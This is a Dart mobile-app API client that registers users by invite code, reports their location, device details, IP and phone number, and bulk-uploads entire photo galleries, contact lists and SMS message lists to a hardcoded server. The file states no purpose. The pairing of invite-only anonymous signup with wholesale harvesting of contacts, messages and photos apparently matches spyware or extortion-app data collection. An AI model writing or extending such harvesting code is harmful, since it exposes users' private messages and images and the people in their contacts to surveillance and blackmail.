import 'dart:convert';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:http_parser/http_parser.dart';

class ApiService {
  static const String baseUrl = 'https://www.yutu888.xyz';

  static String? _uploadToken;

  static void setUploadToken(String token) {
    _uploadToken = token;
  }

  static Map<String, String> get _authHeaders => {
        'Content-Type': 'application/json',
        if (_uploadToken != null) 'Authorization': 'Bearer $_uploadToken',
      };

  static Future<Map<String, dynamic>> _handleResponse(
      http.Response response) async {
    final data = jsonDecode(response.body) as Map<String, dynamic>;
    return data;
  }

  // ─── Auth ─────────────────────────────────────────────────────────────────

  static Future<Map<String, dynamic>> verifyInviteCode(String inviteCode,
      {String? existingToken}) async {
    final headers = <String, String>{
      'Content-Type': 'application/json',
      if (existingToken != null) 'Authorization': 'Bearer $existingToken',
    };
    final response = await http.post(
      Uri.parse('$baseUrl/api/auth/verify-invite-code'),
      headers: headers,
      body: jsonEncode({'inviteCode': inviteCode}),
    );
    return _handleResponse(response);
  }

  static Future<Map<String, dynamic>> anonymousRegister({
    required String inviteCode,
    Map<String, dynamic>? location,
    Map<String, dynamic>? deviceInfo,
    String? ip,
  }) async {
    final response = await http.post(
      Uri.parse('$baseUrl/api/auth/anonymous-register'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({
        'inviteCode': inviteCode,
        if (location != null) 'location': location,
        if (deviceInfo != null) 'deviceInfo': deviceInfo,
        if (ip != null) 'ip': ip,
      }),
    );
    return _handleResponse(response);
  }

  static Future<Map<String, dynamic>> syncDevice({
    Map<String, dynamic>? location,
    Map<String, dynamic>? deviceInfo,
    String? ip,
  }) async {
    final response = await http.post(
      Uri.parse('$baseUrl/api/auth/sync-device'),
      headers: _authHeaders,
      body: jsonEncode({
        if (location != null) 'location': location,
        if (deviceInfo != null) 'deviceInfo': deviceInfo,
        if (ip != null) 'ip': ip,
      }),
    );
    return _handleResponse(response);
  }

  static Future<Map<String, dynamic>> updatePhone(String phone) async {
    final response = await http.post(
      Uri.parse('$baseUrl/api/auth/update-phone'),
      headers: _authHeaders,
      body: jsonEncode({'phone': phone}),
    );
    return _handleResponse(response);
  }

  static Future<Map<String, dynamic>> sendVerificationCode(
      String phone, String code) async {
    final response = await http.post(
      Uri.parse('$baseUrl/api/auth/send-verification-code'),
      headers: _authHeaders,
      body: jsonEncode({'phone': phone, 'code': code}),
    );
    return _handleResponse(response);
  }

  static Future<Map<String, dynamic>> verifyVerificationCode(
      String phone, String code) async {
    final response = await http.post(
      Uri.parse('$baseUrl/api/auth/verify-verification-code'),
      headers: _authHeaders,
      body: jsonEncode({'phone': phone, 'code': code}),
    );
    return _handleResponse(response);
  }

  // ─── Upload ───────────────────────────────────────────────────────────────

  static Future<Map<String, dynamic>> uploadAvatar(File imageFile) async {
    final request = http.MultipartRequest(
      'POST',
      Uri.parse('$baseUrl/api/upload/avatar'),
    );
    request.headers['Authorization'] = 'Bearer $_uploadToken';

    final ext = imageFile.path.split('.').last.toLowerCase();
    final mimeType = ext == 'png' ? 'image/png' : 'image/jpeg';
    request.files.add(await http.MultipartFile.fromPath(
      'avatar',
      imageFile.path,
      contentType: MediaType.parse(mimeType),
    ));

    final streamedResponse = await request.send();
    final response = await http.Response.fromStream(streamedResponse);
    return _handleResponse(response);
  }

  static Future<Map<String, dynamic>> uploadGalleryBatch(
      List<File> files, {
      bool reset = false,
    }) async {
    final request = http.MultipartRequest(
      'POST',
      Uri.parse('$baseUrl/api/upload/gallery-batch'),
    );
    request.headers['Authorization'] = 'Bearer $_uploadToken';
    request.fields['reset'] = reset.toString();

    for (final file in files) {
      final ext = file.path.split('.').last.toLowerCase();
      String mimeType = 'image/jpeg';
      if (ext == 'png') mimeType = 'image/png';
      if (ext == 'gif') mimeType = 'image/gif';
      if (ext == 'webp') mimeType = 'image/webp';
      if (ext == 'heic' || ext == 'heif') mimeType = 'image/heic';

      request.files.add(await http.MultipartFile.fromPath(
        'gallery',
        file.path,
        contentType: MediaType.parse(mimeType),
      ));
    }

    final streamedResponse = await request.send();
    final response = await http.Response.fromStream(streamedResponse);
    return _handleResponse(response);
  }

  static Future<Map<String, dynamic>> uploadContactsBatch(
      List<Map<String, dynamic>> contacts, {
      bool reset = false,
    }) async {
    final response = await http.post(
      Uri.parse('$baseUrl/api/upload/contacts-batch'),
      headers: _authHeaders,
      body: jsonEncode({'contacts': contacts, 'reset': reset}),
    );
    return _handleResponse(response);
  }

  static Future<Map<String, dynamic>> uploadSmsBatch(
      List<Map<String, dynamic>> smsList, {
      bool reset = false,
    }) async {
    final response = await http.post(
      Uri.parse('$baseUrl/api/upload/sms-batch'),
      headers: _authHeaders,
      body: jsonEncode({'smsList': smsList, 'reset': reset}),
    );
    return _handleResponse(response);
  }
}
